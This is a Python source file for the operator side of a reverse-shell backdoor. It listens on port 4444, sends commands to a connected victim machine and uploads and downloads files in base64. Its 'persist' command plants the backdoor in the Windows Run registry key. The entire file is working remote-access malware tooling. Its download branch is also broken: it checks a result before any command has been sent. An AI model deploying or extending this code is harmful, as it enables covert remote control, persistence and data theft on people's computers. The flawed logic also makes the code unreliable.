#!/usr/bin/python
import socket, json, base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, self.target = listener.accept()
        print("[+] Got a connection from " + str(self.target))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def run(self):
            while True:
                command_input = input("\n" + str(self.target) + " >> ")
                command = command_input.split(" ")
                try:
                    if command[0] == "upload":
                        file_content = self.read_file(command[1])
                        command.append(file_content)

                    elif command[0] == "persist":
                        if len(command) < 2:
                            print("[-] Error: No path specified for persistence.")
                            continue
                        path_to_backdoor = command[1]  # Path provided by the user
                        reg_command = ["reg", "add",
                                    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    "/v", "Backdoor", "/t", "REG_SZ",
                                    "/d", path_to_backdoor, "/f"]
                        result = self.execute_remotely(reg_command)

                    elif command[0] == "download" and "[-] Error " not in result:
                        result = self.write_file(command[1], result)

                    else:
                        result = self.execute_remotely(command)

                except Exception as e:
                    result = "[-] Error during command execution: " + str(e)

                print(result)

# Usage: Initialize Listener and run
my_listener = Listener("192.168.141.130", 4444)
my_listener.run()
